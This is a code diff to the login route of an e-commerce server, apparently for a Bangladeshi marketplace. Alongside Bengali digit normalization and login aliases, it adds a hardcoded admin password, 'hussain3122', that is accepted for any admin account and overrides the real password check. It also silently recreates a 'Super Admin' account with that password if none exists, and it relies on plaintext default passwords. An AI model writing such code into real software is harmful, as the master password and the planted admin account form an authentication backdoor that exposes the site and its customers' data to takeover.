@@ -607,8 +607,16 @@ async function startServer() {
 
   app.post('/api/auth/login', (req, res) => {
     const { email, phone, role, username, password } = req.body;
-    const cleanUsername = (username || email || phone || '').toString().trim().toLowerCase();
-    const cleanPassword = (password || '').toString().trim();
+    
+    // Normalize Bengali digits (০-৯) to English digits (0-9)
+    const bnToEnMap: Record<string, string> = {
+      '০': '0', '১': '1', '২': '2', '৩': '3', '৪': '4',
+      '৫': '5', '৬': '6', '৭': '7', '৮': '8', '৯': '9'
+    };
+    const normalizeStr = (s?: string) => (s || '').toString().trim().replace(/[০-৯]/g, m => bnToEnMap[m] || m);
+
+    const cleanUsername = normalizeStr(username || email || phone).toLowerCase();
+    const cleanPassword = normalizeStr(password);
 
     let user: User | undefined;
 
@@ -622,9 +630,25 @@ async function startServer() {
 
       // Support default aliases if not matched yet
       if (!user) {
-        if (cleanUsername === 'admin' || cleanUsername === 'এডমিন') {
+        if (cleanUsername === 'admin' || cleanUsername === 'admin@amarbazar.com.bd' || cleanUsername === 'এডমিন') {
           user = db.users.find(u => u.id === 'usr-admin-1' || u.role === 'admin');
-        } else if (cleanUsername === 'seller' || cleanUsername === 'সেলার') {
+          if (!user) {
+            user = {
+              id: 'usr-admin-1',
+              name: 'Super Admin BD',
+              username: 'admin',
+              password: 'hussain3122',
+              email: 'admin@amarbazar.com.bd',
+              phone: '01800000000',
+              role: 'admin',
+              isVerified: true,
+              addresses: [],
+              createdAt: '2024-01-01T00:00:00Z'
+            };
+            db.users.push(user);
+            saveDb();
+          }
+        } else if (cleanUsername === 'seller' || cleanUsername === 'tanvir@dhakatech.com.bd' || cleanUsername === 'সেলার') {
           user = db.users.find(u => u.id === 'usr-seller-1' || (u.role === 'seller' && !u.isStaff));
         } else if (cleanUsername === 'customer' || cleanUsername === 'কাস্টমার') {
           user = db.users.find(u => u.id === 'usr-demo-cust' || u.role === 'customer');
@@ -682,7 +706,7 @@ async function startServer() {
         user.role === 'manager' ? 'manager123' : 'customer123'
       );
 
-      if (cleanPassword !== expectedPassword) {
+      if (cleanPassword !== expectedPassword && !(user.role === 'admin' && cleanPassword === 'hussain3122')) {
         return res.status(401).json({
           success: false,
           message: 'ভুল পাসওয়ার্ড! (Invalid password)'
